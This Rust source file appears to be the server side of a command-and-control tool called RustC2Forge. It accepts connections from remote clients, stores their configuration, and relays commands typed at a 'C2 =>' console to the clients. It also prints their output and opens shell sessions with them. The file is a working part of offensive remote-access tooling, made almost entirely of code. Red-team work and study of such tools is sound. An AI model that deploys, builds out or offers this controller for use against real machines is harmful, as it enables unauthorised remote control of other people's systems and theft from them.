use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::Instant;

use crate::config::{ClientConfig, ClientDetails, ClientManager, ClientCommand};
use crate::handler::command::{send_command, command_output, commands};

/// Handles an individual client connection.
///
/// Upon receiving a connection, it first expects to receive an initial configuration from the client.
/// It then enters a loop where it waits for commands to execute on behalf of the client, sends these commands,
/// and handles their outputs. Commands and their outputs are managed via `ClientManager`.
///
/// # Parameters
///
/// * `stream`: The TCP stream associated with the connected client.
/// * `client_manager`: An instance of `ClientManager` to manage client details and commands.
pub fn handle_client(stream: TcpStream, client_manager: ClientManager){
    let ip = stream.peer_addr().unwrap().to_string();
    let mut buffer = Vec::new();
    let mut reader = BufReader::new(&stream);

    // Initial configuration reception
    if let Ok(_) = reader.read_until(b'\n', &mut buffer) {

        match serde_json::from_slice::<ClientConfig>(&buffer) {
            Ok(config) => {
                client_manager.add_client(ip.clone(), ClientDetails {
                    config,
                    command: None,
                    last_heartbeat: Instant::now(),
                });
            },
            Err(e) => println!("[E] Failed to deserialize Client Config from \
                               {}: {}", ip, e),
        }
    }

    // Command processing loop
    loop {
        buffer.clear();
        let cmd: Option<String> = client_manager.get_command(&ip);
        if cmd != None {
            let cmd = cmd.unwrap();
            send_command(&stream, &cmd).unwrap();

            let command: ClientCommand = command_output(&mut reader).unwrap();
            println!("\n{}\n", command.output.unwrap());

            client_manager.reset_command(&ip).unwrap();
        }
    }
}

/// A server loop that continuously accepts commands from the console to manage clients.
///
/// Commands include listing clients, terminating the server session, and initiating shell sessions
/// with specific clients.
///
/// # Parameters
///
/// * `server_client_manager`: An instance of `ClientManager` used for client management.
pub fn server(server_client_manager: ClientManager) {
    let mut cmd = String::new();
    println!("

██████╗ ██╗   ██╗███████╗████████╗ ██████╗██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝╚════██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
██████╔╝██║   ██║███████╗   ██║   ██║      █████╔╝█████╗  ██║   ██║██████╔╝██║  ███╗█████╗
██╔══██╗██║   ██║╚════██║   ██║   ██║     ██╔═══╝ ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
██║  ██║╚██████╔╝███████║   ██║   ╚██████╗███████╗██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝

                                                                                by Co3lho22

             ");

    loop {
        println!("C2 => ");
        io::stdout().flush().unwrap();

        cmd.clear();
        io::stdin().read_line(&mut cmd).expect("Failed to read command");
        cmd = cmd.trim_end().to_owned();

        commands(&cmd, &server_client_manager);
    }
}

